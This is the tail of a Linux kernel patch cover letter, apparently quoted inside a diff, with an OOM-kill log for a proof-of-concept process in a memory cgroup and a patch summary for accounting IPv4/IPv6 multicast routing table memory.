+[   65.587984] pgdeactivate 1
+[   65.587984] pglazyfree 0
+[   65.587984] pglazyfreed 0
+[   65.587984] swpin_zero 0
+[   65.587984] swpout_zero 0
+[   65.587985] Memory cgroup min protection 0kB -- low protection 0kB
+[   65.587985] Tasks state (memory values in pages):
+[   65.587986] [  pid  ]   uid  tgid total_vm      rss rss_anon rss_file rss_shmem pgtables_bytes swapents oom_score_adj name
+[   65.587987] [    294]     0   294      261      179       12      167         0    40960        0             0 poc.static
+[   65.587989] oom-kill:constraint=CONSTRAINT_MEMCG,nodemask=(null),cpuset=/,mems_allowed=0,oom_memcg=/mrtest,task_memcg=/mrtest,task=poc.static,pid=294,uid=0
+[   65.587995] Memory cgroup out of memory: Killed process 294 (poc.static) total-vm:1044kB, anon-rss:48kB, file-rss:668kB, shmem-rss:0kB, UID:0 pgtables:40kB oom_score_adj:0
+-----END crash log-----
+
+Best regards,
+Zihan Xi
+
+
+Zihan Xi (1):
+  ipmr: account multicast table and route memory
+
+ net/ipv4/ipmr.c      | 3 ++-
+ net/ipv4/ipmr_base.c | 2 +-
+ net/ipv6/ip6mr.c     | 2 +-
+ 3 files changed, 4 insertions(+), 3 deletions(-)
+
+
+base-commit: 641d03105cc0d2437e32fdeec164f91a4ccef6c4
+-- 
+2.43.0
+
